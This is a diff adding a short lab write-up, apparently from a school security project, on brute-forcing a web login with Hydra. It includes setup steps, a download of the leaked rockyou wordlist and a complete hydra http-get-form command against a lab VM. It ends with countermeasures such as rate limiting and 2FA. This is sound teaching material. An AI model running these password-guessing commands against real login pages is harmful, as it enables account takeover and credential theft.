@@ -1,0 +1,53 @@
+
+Brute force attack on login page
+
+Brute forcing is one of the most common methods attackers use to get user credentials.
+With this method a user password can be stolen by simply trying out as many different passwords
+as possible until a login was successfuly.
+There are many tools for this attack one of which is called "Hydra".
+
+
+Hydra guide on codam iMac for the eval
+
+-	docker run -it debian
+-	apt-get update && apt-get -y install build-essential && apt-get install hydra
+-	download rockyou wordlist
+	-	wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+-	extract rockyou
+	-	tar xf rockyou.txt.tar.gz
+-	hydra -l webmaster@borntosec.com -P ./rockyou.txt 10.11.6.19 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=<img src=\"images/WrongAnswer.gif\" alt=\"\">"
+	-	vbox port forwarding needs to be set to host port 80
+
+command structure:
+		hydra
+		[-l LOGIN|-L FILE] #login name or list
+		[-p PASS|-P FILE] #password or list
+		[-u] #every user
+		[-f] #stop on first match
+		[IP] #IP of target website
+		[-s PORT] #target port
+		[MODULE] #module selection (HTTP/SSH/RDP/etc...)
+		[url]:[form params]:[condition string] #module settings
+
+How to counter brute force attacks:
+	1.	Introduce a strong password policy
+		-	a password should contain at least...
+			-	8 characters
+			-	1 digit
+			-	1 special character
+			-	1 lowercase character
+			-	1 uppercase character
+		-	and the password should not contain the users name
+	2.	Implement rate limiting
+		-	Limit the number of login attempts that a user
+			can make within a specific time frame.
+			If a user exceeds the limit, their IP address can
+			be temporarily blocked or the account can be locked.
+	3.	Use two factor authentication
+		-	2FA adds an extra security layer by sending a
+			one time password to the users e-mail or phone.
+	4.	Monitor user logins
+		-	Regularly monitor login logs for any suspicious activity,
+			such as repeated failed login attempts from the same IP address.
+			This can help you to quickly detect and respond
+			to potential brute force attacks.
